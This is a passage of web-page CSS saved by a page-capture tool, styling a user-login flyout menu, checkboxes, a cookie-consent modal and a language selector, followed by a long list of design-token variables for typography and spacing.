:host(*) { border-block: initial; border-inline: initial; border-start-start-radius: initial; border-start-end-radius: initial; border-end-start-radius: initial; border-end-end-radius: initial; overflow-block: initial; overflow-inline: initial; overscroll-behavior-block: initial; overscroll-behavior-inline: initial; margin-block: initial; margin-inline: initial; scroll-margin-block: initial; scroll-margin-inline: initial; padding-block: initial; padding-inline: initial; scroll-padding-block: initial; scroll-padding-inline: initial; inset-block: initial; inset-inline: initial; block-size: initial; min-block-size: initial; max-block-size: initial; inline-size: initial; min-inline-size: initial; max-inline-size: initial; contain-intrinsic-block-size: initial; contain-intrinsic-inline-size: initial; background: initial; background-blend-mode: initial; border: initial; border-radius: initial; box-decoration-break: initial; -moz-float-edge: initial; display: initial; position: initial; float: initial; clear: initial; vertical-align: initial; baseline-source: initial; overflow: initial; overflow-anchor: initial; transform: initial; rotate: initial; scale: initial; translate: initial; offset: initial; scroll-behavior: initial; scroll-snap-align: initial; scroll-snap-type: initial; scroll-snap-stop: initial; overscroll-behavior: initial; isolation: initial; break-after: initial; break-before: initial; break-inside: initial; resize: initial; perspective: initial; perspective-origin: initial; backface-visibility: initial; transform-box: initial; transform-style: initial; transform-origin: initial; contain: initial; content-visibility: initial; container: initial; appearance: initial; -moz-orient: initial; will-change: initial; shape-image-threshold: initial; shape-margin: initial; shape-outside: initial; touch-action: initial; -webkit-line-clamp: initial; scrollbar-gutter: initial; zoom: initial; columns: initial; column-fill: initial; column-rule: initial; column-span: initial; content: initial; counter-increment: initial; counter-reset: initial; counter-set: initial; opacity: initial; box-shadow: initial; clip: initial; filter: initial; backdrop-filter: initial; mix-blend-mode: initial; font-style: initial; font-variant: initial; font-weight: initial; font-size-adjust: initial; font-synthesis: initial; font-stretch: initial; font-kerning: initial; font-feature-settings: initial; font-variation-settings: initial; font-language-override: initial; font-optical-sizing: initial; font-palette: initial; math-depth: initial; math-style: initial; line-height: initial; visibility: initial; writing-mode: initial; text-orientation: initial; print-color-adjust: initial; image-rendering: initial; image-orientation: initial; dominant-baseline: initial; text-anchor: initial; color-interpolation: initial; color-interpolation-filters: initial; fill: initial; fill-opacity: initial; fill-rule: initial; shape-rendering: initial; stroke: initial; stroke-width: initial; stroke-linecap: initial; stroke-linejoin: initial; stroke-miterlimit: initial; stroke-opacity: initial; stroke-dasharray: initial; stroke-dashoffset: initial; clip-rule: initial; marker: initial; paint-order: initial; border-collapse: initial; empty-cells: initial; caption-side: initial; border-spacing: initial; color: initial; text-transform: initial; hyphens: initial; -moz-text-size-adjust: initial; text-indent: initial; overflow-wrap: initial; word-break: initial; text-justify: initial; text-align-last: initial; text-align: initial; letter-spacing: initial; word-spacing: initial; white-space: initial; text-shadow: initial; text-emphasis: initial; text-emphasis-position: initial; tab-size: initial; line-break: initial; -webkit-text-fill-color: initial; -webkit-text-stroke: initial; ruby-align: initial; ruby-position: initial; text-combine-upright: initial; text-rendering: initial; text-underline-offset: initial; text-underline-position: initial; text-decoration-skip-ink: initial; hyphenate-character: initial; forced-color-adjust: initial; -webkit-text-security: initial; hyphenate-limit-chars: initial; text-wrap: initial; cursor: initial; pointer-events: initial; caret-color: initial; accent-color: initial; color-scheme: initial; scrollbar-color: initial; list-style: initial; quotes: initial; margin: initial; overflow-clip-margin: initial; scroll-margin: initial; outline: initial; outline-offset: initial; padding: initial; scroll-padding: initial; page: initial; inset: initial; z-index: initial; flex-flow: initial; place-content: initial; place-items: initial; flex: initial; place-self: initial; order: initial; height: initial; min-height: initial; max-height: initial; width: initial; min-width: initial; max-width: initial; box-sizing: initial; object-fit: initial; object-position: initial; grid-area: initial; grid: initial; gap: initial; aspect-ratio: initial; contain-intrinsic-size: initial; vector-effect: initial; stop-color: initial; stop-opacity: initial; flood-color: initial; flood-opacity: initial; lighting-color: initial; mask-type: initial; clip-path: initial; mask: initial; x: initial; y: initial; cx: initial; cy: initial; rx: initial; ry: initial; r: initial; d: initial; table-layout: initial; text-overflow: initial; text-decoration: initial; ime-mode: initial; scrollbar-width: initial; user-select: initial; -moz-window-dragging: initial; -moz-force-broken-image-icon: initial; transition: initial; animation: initial; animation-composition: initial; -moz-box-align: initial; -moz-box-direction: initial; -moz-box-flex: initial; -moz-box-orient: initial; -moz-box-pack: initial; -moz-box-ordinal-group: initial; font-family: &quot;Post-sans&quot;, sans-serif; font-size: 16px; }

.pnl-user-menu .pci-flyout__list { right: 0px; left: unset; top: 10px; z-index: 1000000; box-sizing: border-box; box-shadow: none; border: 1px solid rgb(190, 192, 203); border-radius: 0.25em; inline-size: calc(-1.5rem + 100vw); max-inline-size: 350px; padding: 1em 1em 1.5em !important; }

@media (min-width: 30em) {
  .pnl-user-menu .pci-flyout__list { width: calc(-2rem + 100vw); }
}

@media (min-width: 42.5em) {
  .pnl-user-menu .pci-flyout__list { width: calc(-3rem + 100vw); }
}

@media (min-width: 48em) {
  .pnl-user-menu .pci-flyout__list { width: auto; min-width: 260px; }
}

.pci-flyout__list::before { display: none; }

@media (min-width: 48em) {
  .pnl-user-menu { width: 200px; }
  .pnl-user-menu::after { width: 100%; height: 25px; z-index: 1; content: &quot;&quot;; display: block; position: absolute; }
}

.pnl-user-menu__login .pci-flyout__icon { margin: 0px 0.5rem; }

.pnl-user-menu__login .pci-flyout__list { right: -66px !important; }

@media (min-width: 48em) {
  .pnl-user-menu__login .pci-flyout__list { right: -32% !important; }
}

.pnl-user-menu__login .pci-flyout__list::before { right: 72px !important; }

@media (max-width: 48em) {
  .pnl-user-menu__positioning .pci-flyout__list { right: -66px; }
}

.pci-flyout__list-item { position: relative; flex-direction: column; }

.pci-flyout__icon { display: flex; margin-inline-end: 0.5em; color: rgb(78, 78, 226); }

.pci-flyout__trigger .pci-flyout__icon { color: rgb(78, 78, 226); transition: none; }

.pci-align-menu-item .pci-flyout__icon { margin-inline-end: 0px; }

.pci-align-menu-item .pci-flyout__icon > svg { width: unset; }

.pci-flyout__link { display: flex; align-items: center; color: rgb(78, 78, 226) !important; border: medium; border-radius: 0.25rem; transition: none; cursor: pointer; }

.pci-flyout__link span { padding-inline-end: 0.125rem; border-bottom: 1px solid transparent; }

.pci-flyout__link:hover span { border-bottom-color: rgb(78, 78, 226); }

.pci-flyout__link:focus:not(:focus-visible) { outline: none; border: medium; }

.pci-flyout__link:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 2px; border-bottom: medium; }

.pci-align-menu-item { flex-direction: row-reverse; margin: 0px auto; padding-inline-start: 0.25em; }

.pci-flyout__list-item .pci-button { width: 100%; text-wrap: balance; }

.pci-button__register { color: rgb(78, 78, 226); font-weight: 400; }

.pnl-user-menu__name { color: rgb(78, 78, 226); font-weight: 500 !important; text-transform: capitalize; }

.pnl-user-menu__simpleloginbutton { position: relative; height: 40px; min-width: unset; font-family: &quot;Hanken Grotesk&quot;, Arial, Helvetica, sans-serif, sans-serif; font-feature-settings: &quot;ss03&quot;, &quot;ss01&quot;; font-size: 1rem; border: medium; border-radius: 0.25rem; color: rgb(78, 78, 226); transition: none; }

.pnl-user-menu__simpleloginbutton:focus:not(:focus-visible) { outline: none; }

.pnl-user-menu__simpleloginbutton:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 2px; }

.pnl-user-menu__simpleloginbutton::after { content: &quot;&quot;; position: absolute; inset: 0px; z-index: -1; transform: scale(1.5); }

.pnl-user-menu__simpleloginbutton[aria-expanded=&quot;true&quot;]::before { content: &quot;&quot;; width: 0.875rem; height: 0.875rem; top: 50px; right: 2px; position: absolute; z-index: 2000000; background: rgb(255, 255, 255); pointer-events: none; border-top: 1px solid rgb(190, 192, 203); border-left: 1px solid rgb(190, 192, 203); transform: rotate(45deg) translateX(-0.625rem); }

.pnl-user-menu__simpleloginbutton:hover { cursor: pointer; }

.pnl-user-menu__simpleloginbutton.pci-flyout__trigger { margin-left: auto; min-width: unset; font-weight: 500; background-color: transparent; }

.is-hidden { position: relative; visibility: hidden; z-index: -1; }

.is-visible { visibility: visible; position: relative; z-index: 1000001; }" data-scrapbook-adoptedstylesheet-7="html { text-rendering: optimizespeed; }

@media (min-width: 480px) {
  html { text-rendering: optimizelegibility; }
}

@media (min-device-pixel-ratio: 2), (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
  html { }
}

*, ::before, ::after { box-sizing: inherit; }

html { box-sizing: border-box; }

*, ::before, ::after { box-sizing: inherit; }

html { box-sizing: border-box; background-color: rgb(255, 255, 255); }

body { margin: 0px; color: rgb(39, 50, 76); font-weight: 300; line-height: 1.5; font-family: &quot;Post-sans&quot;, sans-serif; font-kerning: normal; scroll-behavior: smooth; text-rendering: optimizespeed; }

@media print {
  body { font-family: sans-serif; }
}

@media (min-width: 768px) {
  body { min-height: 100vh; }
}

main { display: block; }

img, video { max-width: 100%; height: auto; border-style: none; }

fieldset { margin: 0px; border: 0px; padding: 0px; }

[hidden] { display: none; }

[tabindex=&quot;-1&quot;]:focus { outline: 0px; }

:focus:not(:focus-visible) { outline: none; }

ul[class], ol[class] { padding: 0px; }

ul[class] { list-style: none; }

a:not([class]) { text-decoration-skip-ink: auto; }

.pci-flyout { display: inline-block; position: relative; }

.pci-flyout__trigger { display: flex; align-items: center; padding: 0px 0px 0px 8px; }

.pci-flyout__trigger .pci-button__text { max-width: 8ch; overflow: hidden; white-space: nowrap; text-overflow: ellipsis; }

@media (min-width: 768px) {
  .pci-flyout__trigger .pci-button__text { max-width: 15ch; }
}

.pci-flyout__trigger .pci-flyout__icon { display: flex; color: rgb(237, 112, 0); margin-left: 8px; align-items: center; transition: transform 250ms cubic-bezier(0.4, 0, 0.2, 1), transform 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.contrast .pci-flyout__trigger .pci-flyout__icon { color: rgb(52, 64, 182); }

.pci-flyout__trigger[aria-expanded=&quot;false&quot;] .pci-flyout__icon { transform: rotate(-180deg); }

.pci-flyout__list { margin: 0px; left: -50%; padding: 16px; z-index: 9999; list-style: none; position: absolute; top: calc(100% + 16px); background-color: rgb(255, 255, 255); transform: translateX(8px); border-radius: 4px 4px 0px; box-shadow: rgba(0, 0, 0, 0.15) 3px 0px 9px 0px; }

@media (min-width: 768px) {
  .pci-flyout__list { width: auto; }
}

.pci-flyout__list::before { position: absolute; top: 0px; left: 50%; width: 14px; height: 14px; content: &quot;&quot;; background: rgb(255, 255, 255); border-top: 1px solid rgb(232, 232, 232); border-left: 1px solid rgb(232, 232, 232); transform: rotate(45deg) translateX(-10px); }

.pci-flyout__list-item { display: flex; white-space: nowrap; }

.pci-flyout__list-item + .pci-flyout__list-item { margin-top: 16px !important; }

.pci-flyout__list-item:last-child { flex-wrap: wrap; }

.pci-flyout__label { display: block; width: 100%; font-weight: 400; margin-bottom: 8px; }

.pci-flyout__status { height: 30px; width: 30px; }

.pci-flyout__icon { color: rgb(237, 112, 0); margin-right: 16px; vertical-align: middle; }

.contrast .pci-flyout__icon { color: rgb(52, 64, 182); }

.pci-flyout__icon > svg { width: 18px; }

.pci-flyout__list-item .pci-flyout__icon > svg { width: 26px; }

.pci-flyout__link { display: table; text-decoration: none; color: rgb(237, 112, 0) !important; border-bottom: 1px solid transparent; transition: 250ms cubic-bezier(0.4, 0, 0.2, 1); }

.contrast .pci-flyout__link { color: rgb(52, 64, 182); }

.pci-flyout__link:hover, .pci-flyout__link:focus { color: rgb(237, 112, 0); border-bottom-color: rgb(237, 112, 0); }

.contrast .pci-flyout__link:hover, .contrast .pci-flyout__link:focus { color: rgb(52, 64, 182); border-bottom-color: rgb(52, 64, 182); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

@font-face { src: url(&quot;&quot;) format(&quot;woff2&quot;); }

.pci-checkbox { display: flex; flex-wrap: wrap; position: relative; }

input[type=&quot;checkbox&quot;], .pci-checkbox__input { position: absolute; top: 0px; left: 0px; height: 24px; width: 24px; opacity: 0; }

input[type=&quot;checkbox&quot;]:disabled + .pci-checkbox__label:hover, .pci-checkbox__input:disabled + .pci-checkbox__label:hover { color: inherit; }

input[type=&quot;checkbox&quot;]:disabled + .pci-checkbox__label::before, .pci-checkbox__input:disabled + .pci-checkbox__label::before { border: 0px; background-color: rgb(243, 244, 247); }

.pci-checkbox__sub-text { font-weight: 300; }

.pci-checkbox__label { display: flex; font-family: inherit; text-align: left; align-items: start; min-height: 24px; cursor: pointer; font-weight: normal; }

.pci-checkbox__label::before { content: &quot;&quot;; flex-shrink: 0; width: 24px; height: 24px; display: block; margin-right: 16px; border-radius: 4px; border: 1px solid rgb(138, 148, 168); background-color: rgb(255, 255, 255); text-align: center; background-size: 18px; background-repeat: no-repeat; background-position: center center; }

.pci-checkbox__label:hover::before { border-color: rgb(52, 64, 182); }

.pci-checkbox__label ~ .pci-tooltip { margin-left: 3px; }

.pci-checkbox__input:disabled + .pci-checkbox__label { cursor: not-allowed; }

.pci-checkbox__input:disabled + .pci-checkbox__label::before { border-color: transparent; background-color: rgb(243, 244, 247); }

.pci-checkbox__input:disabled + .pci-checkbox__label::after { color: rgb(173, 181, 197); }

.pci-checkbox__input:checked + .pci-checkbox__label::before { color: rgb(237, 112, 0); background-image: url(&quot;&quot;); }

.pci-checkbox__input:focus + .pci-checkbox__label::before { box-shadow: rgb(255, 255, 255) 0px 0px 0px 1px, rgb(52, 64, 182) 0px 0px 0px 3px; }

.pci-checkbox__input:focus:not(:focus-visible) + .pci-checkbox__label::before { box-shadow: none; }

.pci-checkbox__input:hover + .pci-checkbox__label::before { border-color: rgb(52, 64, 182); }

.is-error .pci-checkbox__input:checked + .pci-checkbox__label::before { background-image: url(&quot;&quot;); }

.is-error .pci-checkbox__input + .pci-checkbox__label::after { color: rgb(215, 0, 54); }

.is-error .pci-checkbox__input + .pci-checkbox__label::before { border-color: rgb(215, 0, 54); }

.pci-checkbox__input.ng-invalid.ng-touched + .pci-checkbox__label::before { border-color: rgb(215, 0, 54); }

.pci-checkbox--intermediate .pci-checkbox__input:checked + .pci-checkbox__label::before { background-image: url(&quot;&quot;); background-size: 20px; background-position: center center; }

.pci-checkbox__link { font-weight: inherit; color: rgb(39, 50, 76); text-decoration: underline; }

.pci-inner-container { max-width: 480px; margin: 0px auto; padding-left: 16px; padding-right: 16px; }

@media (min-width: 480px) {
  .pci-inner-container { padding-left: 20px; padding-right: 20px; }
}

@media (min-width: 680px) {
  .pci-inner-container { padding-left: 32px; padding-right: 32px; }
}

@media (min-width: 800px) {
  .pci-inner-container { padding-left: 44px; padding-right: 44px; }
}

@media (min-width: 1040px) {
  .pci-inner-container { padding-left: 52px; padding-right: 52px; }
}

@media (min-width: 1176px) {
  .pci-inner-container { padding-left: 0px; padding-right: 0px; }
}

.pnl-cookie-wall .pci-modal { inset: 0px; display: flex; position: fixed; z-index: 999999; align-items: center; justify-content: center; background-color: rgba(0, 0, 0, 0.2); font-family: &quot;Post-sans&quot;, sans-serif; }

.pnl-cookie-wall .pci-modal__body { overflow: auto; font-weight: 300; padding: 1em 1.5em; }

.pci-modal__body-inner p .pci-link, .pci-modal__body-inner p a { color: rgb(52, 64, 182); font-weight: 300; text-decoration: underline; }

.pnl-cookie-wall .pci-modal__content { width: 100%; max-width: 25.4375em; height: fit-content; max-height: 96vh; display: flex; text-align: left; position: fixed; flex-direction: column; border-radius: 0.5em; background-color: rgb(255, 255, 255); }

@media (max-width: 57em) {
  .pnl-cookie-wall .pci-modal__content { max-width: 100vw; height: 100vh; max-height: 100vh; border-radius: 0px; }
}

@media (max-width: 20em) {
  .pnl-cookie-wall .pci-modal__content { width: 100vw; max-width: 100vw; height: 100vh; max-height: 100vh; border-radius: 0px; }
}

@media (min-width: 57em) {
  .pnl-cookie-wall .pci-modal__content.wide { max-width: 600px; }
}

.pnl-cookie-wall .pci-modal__content.settings { width: 100%; height: 100%; min-width: 100%; min-height: 100%; overflow: auto; }

.pnl-cookie-wall .pci-modal__content.settings h1, .pnl-cookie-wall .pci-modal__content.settings .h1 { color: rgb(0, 26, 115); font-weight: 300; margin-bottom: 10px; font-size: 43px; line-height: 52px; }

.pnl-cookie-wall .pci-modal__content.settings h2 { color: rgb(237, 112, 0); font-weight: 400; font-size: 28px; line-height: 36px; margin-bottom: 16px; }

.pnl-cookie-wall .pci-modal__content.settings p { margin: 0px; font-weight: 300; }

.pnl-cookie-wall .pci-modal__content.settings .pci-checkbox__label { margin-bottom: 0.5rem; }

.pnl-cookie-wall .pci-modal__footer { position: relative; margin-top: auto; padding: 1em 1.5em 1.5em; }

@media (max-width: 57em) {
  .pnl-cookie-wall .pci-modal__footer::before { content: &quot;&quot;; position: absolute; left: 0px; right: 0px; height: 100px; top: -100px; background: linear-gradient(rgba(255, 255, 255, 0) -33.91%, rgb(255, 255, 255) 81.9%); }
}

.pnl-cookie-wall h1, .pnl-cookie-wall .h1 { color: rgb(237, 112, 0); font-weight: 400; font-size: 28px; line-height: 36px; margin-block: 1em 1rem; }

.pci-cookie-button-container { display: flex; flex-direction: column-reverse; align-items: flex-start; }

@media (min-width: 37.5em) {
  .pci-cookie-button-container { display: flex; flex-direction: column; gap: 1em; justify-content: flex-start; }
}

.settings .pci-cookie-button-container { gap: unset; flex-direction: row; }

.pci-cookie-button-container .pci-button { border-radius: 20px; box-sizing: border-box; font-family: &quot;Post-Sans&quot;, sans-serif; transition: none; }

.pci-cookie-button-container .pci-button.pci-button--primary { color: rgb(255, 255, 255); background-color: rgb(52, 64, 182); }

.pci-cookie-button-container .pci-button.pci-button--secondary { color: rgb(52, 64, 182); background-color: rgb(255, 255, 255); border: 1px solid rgb(52, 64, 182); box-shadow: none; }

.pci-cookie-button-container .pci-button.pci-button--secondary:hover { text-decoration: underline; text-underline-offset: 0.15em; background-color: rgb(255, 255, 255); }

.pci-cookie-button-container .pci-button.pci-button--secondary:active { color: rgb(255, 255, 255); background-color: rgb(0, 26, 115); text-decoration: underline; text-underline-offset: 0.15em; }

.pci-cookie-button-container .pci-button.pci-button--secondary:focus:not(:focus-visible) { outline: none; }

.pci-cookie-button-container .pci-button.pci-button--secondary:focus-visible { box-shadow: none; outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pci-cookie-button-inner { inline-size: 100%; display: flex; flex-direction: column; margin-block-start: 1.5rem; }

@media only screen and (min-width: 37.5em) {
  .pci-cookie-button-inner { margin-left: auto; inline-size: unset; gap: 1em; justify-content: flex-start; flex-direction: row-reverse; }
}

pnl-language-selector { display: flex; }

pnl-language-selector .pnl-language-selector { margin-left: auto; }

pnl-language-selector .pci-flyout__trigger { color: rgb(78, 78, 226); }

pnl-language-selector .pci-flyout__trigger:hover { color: rgb(78, 78, 226); }

.pci-checkbox__ul { list-style-type: none; padding: 0px; }

.pci-checkbox__li { margin-bottom: 2em; margin-block-end: 2em; }

.pci-checkbox__li > p { font-weight: 300; }

.pci-checkbox__li h4 { margin: 0px; font-size: 1em; font-weight: 400; }

ul.pci-flyout__list { padding: 1em; }

@media (max-width: 57em) {
  .whitespace { height: 80px; }
}

.pci-consent__paragraph { margin-bottom: 24px; }

@media only screen and (max-width: 600px) {
  .pci-widget-actions { margin-bottom: 12px; }
}

.pnl-cookie-wall .pci-button { width: unset; }

.pnl-cookie-wall .stamp-button { position: relative; display: flex; align-items: center; justify-content: center; column-gap: 0.5rem; max-inline-size: 100%; padding-block: 0.5rem; font-family: &quot;Post-Sans&quot;, sans-serif; font-weight: 700; line-height: 1.4; font-size: 1rem; text-decoration: none; border: medium; background: none; color: rgb(78, 78, 226); cursor: pointer; border-radius: 4px; }

.pnl-cookie-wall .stamp-button:active { background-color: rgba(255, 255, 255, 0); border-color: rgba(255, 255, 255, 0); color: rgb(0, 26, 115); }

.pnl-cookie-wall .stamp-button:hover { text-decoration: underline; }

.pnl-cookie-wall .stamp-button:focus { outline: none; }

.pnl-cookie-wall .stamp-button:focus-visible { outline: rgb(0, 26, 115) solid 2px; outline-offset: 1px; }

.pnl-cookie-wall .stamp-button--tertiary { background-color: rgba(255, 255, 255, 0); border-color: rgba(255, 255, 255, 0); border-radius: 0.25rem; }

.pnl-cookie-wall .stamp-button--tertiary:hover { color: rgb(78, 78, 226); }

.stamp-button__chevron { display: flex; align-items: center; }

.pci-button--secondary { box-shadow: none; }" data-scrapbook-adoptedstylesheet-1=".stamp-theme-light { --stamp-opacity-illustration-disabled: 60%; --stamp-opacity-illustration-default: 100%; --stamp-opacity-mix-subtle: 10%; --stamp-opacity-mix-strong: 90%; --stamp-opacity-mix-default: 30%; --stamp-opacity-backdrop: 60%; --stamp-blend-mode-disabled: Luminosity; --stamp-blend-mode-default: Normal; --stamp-border-width-l: 4px; --stamp-border-width-m: 2px; --stamp-border-width-s: 1px; --stamp-border-width-xs: 0.5px; --stamp-radius-xxl: 32px; --stamp-radius-xl: 24px; --stamp-radius-l: 16px; --stamp-radius-m: 8px; --stamp-radius-s: 6px; --stamp-radius-xs: 4px; --stamp-radius-xxs: 2px; --stamp-size-medium-illustration-m: 240px; --stamp-size-medium-illustration-s: 204px; --stamp-size-illustration-3-xl: 144px; --stamp-size-illustration-xxl: 120px; --stamp-size-illustration-xl: 96px; --stamp-size-illustration-l: 88px; --stamp-size-illustration-m: 80px; --stamp-size-illustration-s: 56px; --stamp-size-icon-l: 40px; --stamp-size-icon-m: 24px; --stamp-size-icon-s: 16px; --stamp-spacing-outer-xl: 88px; --stamp-spacing-outer-l: 56px; --stamp-spacing-outer-m: 40px; --stamp-spacing-outer-s: 24px; --stamp-spacing-outer-xs: 16px; --stamp-spacing-inner-4-xl: 56px; --stamp-spacing-inner-3-xl: 40px; --stamp-spacing-inner-xxl: 32px; --stamp-spacing-inner-xl: 24px; --stamp-spacing-inner-l: 16px; --stamp-spacing-inner-m: 12px; --stamp-spacing-inner-s: 8px; --stamp-spacing-inner-xs: 4px; --stamp-spacing-inner-xxs: 2px; --stamp-text-app-navigation-selected-letter-spacing: 0px; --stamp-text-app-navigation-selected-font-size: 12px; --stamp-text-app-navigation-selected-line-height: 1.6; --stamp-text-app-navigation-selected-font-weight: 700; --stamp-text-app-navigation-selected-font-family: Hanken Grotesk; --stamp-text-app-navigation-default-letter-spacing: 0px; --stamp-text-app-navigation-default-font-size: 12px; --stamp-text-app-navigation-default-line-height: 1.6; --stamp-text-app-navigation-default-font-weight: 400; --stamp-text-app-navigation-default-font-family: Hanken Grotesk; --stamp-text-step-todo-letter-spacing: 0px; --stamp-text-step-todo-font-size: 16px; --stamp-text-step-todo-line-height: 1.6; --stamp-text-step-todo-font-weight: 400; --stamp-text-step-todo-font-family: Hanken Grotesk; --stamp-text-step-default-letter-spacing: 0px; --stamp-text-step-default-font-size: 16px; --stamp-text-step-default-line-height: 1.6; --stamp-text-step-default-font-weight: 400; --stamp-text-step-default-font-family: Hanken Grotesk; --stamp-text-badge-default-letter-spacing: 0px; --stamp-text-badge-default-font-size: 14px; --stamp-text-badge-default-line-height: 1.05; --stamp-text-badge-default-font-weight: 400; --stamp-text-badge-default-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-selected-letter-spacing: 0px; --stamp-text-form-date-input-date-selected-font-size: 18px; --stamp-text-form-date-input-date-selected-line-height: 1.4; --stamp-text-form-date-input-date-selected-font-weight: 700; --stamp-text-form-date-input-date-selected-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-pressed-text-decoration: underline; --stamp-text-form-date-input-date-pressed-letter-spacing: 0px; --stamp-text-form-date-input-date-pressed-font-size: 18px; --stamp-text-form-date-input-date-pressed-line-height: 1.4; --stamp-text-form-date-input-date-pressed-font-weight: 400; --stamp-text-form-date-input-date-pressed-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-hover-text-decoration: underline; --stamp-text-form-date-input-date-hover-letter-spacing: 0px; --stamp-text-form-date-input-date-hover-font-size: 18px; --stamp-text-form-date-input-date-hover-line-height: 1.4; --stamp-text-form-date-input-date-hover-font-weight: 400; --stamp-text-form-date-input-date-hover-font-family: Hanken Grotesk; --stamp-text-form-date-input-date-default-letter-spacing: 0px; --stamp-text-form-date-input-date-default-font-size: 18px; --stamp-text-form-date-input-date-default-line-height: 1.4; --stamp-text-form-date-input-date-default-font-weight: 400; --stamp-text-form-date-input-date-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-body-highlighted-text-decoration: underline; --stamp-text-form-data-list-body-highlighted-font-size: 14px; --stamp-text-form-data-list-body-highlighted-line-height: 1.6; --stamp-text-form-data-list-body-highlighted-font-weight: 400; --stamp-text-form-data-list-body-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-pressed-letter-spacing: 0px; --stamp-text-form-data-list-body-pressed-font-size: 14px; --stamp-text-form-data-list-body-pressed-line-height: 1.6; --stamp-text-form-data-list-body-pressed-font-weight: 400; --stamp-text-form-data-list-body-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-hover-letter-spacing: 0px; --stamp-text-form-data-list-body-hover-font-size: 14px; --stamp-text-form-data-list-body-hover-line-height: 1.6; --stamp-text-form-data-list-body-hover-font-weight: 400; --stamp-text-form-data-list-body-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-body-default-letter-spacing: 0px; --stamp-text-form-data-list-body-default-font-size: 14px; --stamp-text-form-data-list-body-default-line-height: 1.6; --stamp-text-form-data-list-body-default-font-weight: 400; --stamp-text-form-data-list-body-default-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-highlighted-letter-spacing: 0px; --stamp-text-form-data-list-title-highlighted-text-decoration: underline; --stamp-text-form-data-list-title-highlighted-font-size: 16px; --stamp-text-form-data-list-title-highlighted-line-height: 1.4; --stamp-text-form-data-list-title-highlighted-font-weight: 700; --stamp-text-form-data-list-title-highlighted-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-pressed-letter-spacing: 0px; --stamp-text-form-data-list-title-pressed-font-size: 16px; --stamp-text-form-data-list-title-pressed-line-height: 1.4; --stamp-text-form-data-list-title-pressed-font-weight: 700; --stamp-text-form-data-list-title-pressed-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-hover-letter-spacing: 0px; --stamp-text-form-data-list-title-hover-font-size: 16px; --stamp-text-form-data-list-title-hover-line-height: 1.4; --stamp-text-form-data-list-title-hover-font-weight: 700; --stamp-text-form-data-list-title-hover-font-family: Hanken Grotesk; --stamp-text-form-data-list-title-default-letter-spacing: 0px; --stamp-text-form-data-list-title-default-font-size: 16px; --stamp-text-form-data-list-title-default-line-height: 1.4; --stamp-text-form-data-list-title-default-font-weight: 700; --stamp-text-form-data-list-title-default-font-family: Hanken Grotesk; --stamp-text-form-feedback-letter-spacing: 0px; --stamp-text-form-feedback-font-size: 14px; --stamp-text-form-feedback-line-height: 1.4; --stamp-text-form-feedback-font-weight: 700; --stamp-text-form-feedback-font-family: Hanken Grotesk; --stamp-text-form-label-letter-spacing: 0px; --stamp-text-form-label-font-size: 16px; --stamp-text-form-label-line-height: 1.2; --stamp-text-form-label-font-weight: 700; --stamp-text-form-label-font-family: Hanken Grotesk; --stamp-text-hyperlink-pressed-letter-spacing: 0px; --stamp-text-hyperlink-pressed-text-decoration: underline; --stamp-text-hyperlink-pressed-font-size: 16px; --stamp-text-hyperlink-pressed-line-height: 1.6; --stamp-text-hyperlink-pressed-font-weight: 400; --stamp-text-hyperlink-pressed-font-family: Hanken Grotesk; --stamp-text-hyperlink-hover-letter-spacing: 0px; --stamp-text-hyperlink-hover-text-decoration: underline; --stamp-text-hyperlink-hover-font-size: 16px; --stamp-text-hyperlink-hover-line-height: 1.6; --stamp-text-hyperlink-hover-font-weight: 400; --stamp-text-hyperlink-hover-font-family: Hanken Grotesk; --stamp-text-hyperlink-default-letter-spacing: 0px; --stamp-text-hyperlink-default-text-decoration: underline; --stamp-text-hyperlink-default-font-size: 16px; --stamp-text-hyperlink-default-line-height: 1.6; --stamp-text-hyperlink-default-font-weight: 400; --stamp-text-hyperlink-default-font-family: Hanken Grotesk; --stamp-text-link-s-pressed-text-decoration: underline; --stamp-text-link-s-pressed-letter-spacing: 0px; --stamp-text-link-s-pressed-font-size: 14px; --stamp-text-link-s-pressed-line-height: 1.6; --stamp-text-link-s-pressed-font-weight: 400; --stamp-text-link-s-pressed-font-family: Hanken Grotesk; --stamp-text-link-s-hover-text-decoration: underline; --stamp-text-link-s-hover-letter-spacing: 0px; --stamp-text-link-s-hover-font-size: 14px; --stamp-text-link-s-hover-line-height: 1.6; --stamp-text-link-s-hover-font-weight: 400; --stamp-text-link-s-hover-font-family: Hanken Grotesk; --stamp-text-link-s-default-letter-spacing: 0px; --stamp-text-link-s-default-font-size: 14px; --stamp-text-link-s-default-line-height: 1.6; --stamp-text-link-s-default-font-weight: 400; --stamp-text-link-s-default-font-family: Hanken Grotesk; --stamp-text-link-m-pressed-text-decoration: underline; --stamp-text-link-m-pressed-letter-spacing: 0px; --stamp-text-link-m-pressed-font-size: 16px; --stamp-text-link-m-pressed-line-height: 1.6; --stamp-text-link-m-pressed-font-weight: 400; --stamp-text-link-m-pressed-font-family: Hanken Grotesk; --stamp-text-link-m-hover-text-decoration: underline; --stamp-text-link-m-hover-letter-spacing: 0px; --stamp-text-link-m-hover-font-size: 16px; --stamp-text-link-m-hover-line-height: 1.6; --stamp-text-link-m-hover-font-weight: 400; --stamp-text-link-m-hover-font-family: Hanken Grotesk; --stamp-text-link-m-default-letter-spacing: 0px; --stamp-text-link-m-default-font-size: 16px; --stamp-text-link-m-default-line-height: 1.6; --stamp-text-link-m-default-font-weight: 400; --stamp-text-link-m-default-font-family: Hanken Grotesk; --stamp-text-link-l-pressed-letter-spacing: 0px; --stamp-text-link-l-pressed-font-size: 16px; --stamp-text-link-l-pressed-text-decoration: underline; --stamp-text-link-l-pressed-line-height: 1.4; --stamp-text-link-l-pressed-font-weight: 700; 